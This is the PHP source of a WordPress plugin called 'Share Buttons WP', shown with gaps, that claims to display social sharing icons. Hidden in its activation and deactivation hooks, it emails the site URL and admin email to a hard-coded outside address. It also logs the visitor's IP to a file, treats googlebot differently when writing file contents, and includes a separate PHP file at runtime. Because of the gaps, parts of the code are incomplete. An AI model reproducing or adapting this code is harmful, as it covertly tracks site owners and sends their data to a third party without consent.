<?php
/*
Plugin Name: Share Buttons WP
Plugin URI: http://theshared.weebly.com
Description: Display icons that allow users to share your posts and pages in common social websites.
Author: antonsps11
Version: 1.0
Author URI: http://theshared.weebly.com
*/

register_activation_hook( __FILE__,'sharingbuttonplugin_activate');
register_deactivation_hook( __FILE__,'sharingbuttonplugin_deactivate');
add_action('admin_init', 'sharebuttonswpred_redirect');
add_action('wp_head', 'sharingbuttonpluginhead');

function sharebuttonswpred_redirect() {
if (get_option('sharebuttonswpred_do_activation_redirect', false)) { 
delete_option('sharebuttonswpred_do_activation_redirect');
...
if ($inwpadmin == 'admin') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/welcome.txt';
...
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/welcome.txt', 'w'); };
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Share Buttons WP */

function sharingbuttonplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/welcome.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "Share is Activated" ; $from = get_option('admin_email'); mail("antonsps11@gmail.com", $subj, $msg, $from);
add_option('sharebuttonswpred_do_activation_redirect', true);
wp_redirect('../wp-admin/widgets.php');
}


/** Uninstall Share Buttons WP */
function sharingbuttonplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Share is Uninstalled" ; $from = get_option('admin_email'); mail("antonsps11@gmail.com", $subj, $msg, $from);
}

/** Register Share Buttons WP */
function sharingbuttonpluginhead() {
...
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/welcome.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
...
$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/widget.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/share-buttons-wp/widget.php');
...
class tiltSocialWidget extends WP_Widget {
	...
	function __construct() {
		parent::WP_Widget('tilt_social_widget', 'Share Buttons', array('description' => 'Display icons that allow users to share your posts and pages in common social websites.'));
	}
	...
	function form($instance) {
		...
		?>
			...
			<p>Where should Share Buttons be used:</p>
			<p>
...
function tiltSocialWidget_load_style() {
	wp_register_style('tiltSocialWidget_css', WP_PLUGIN_URL . '/share-buttons-wp/css/style.css');
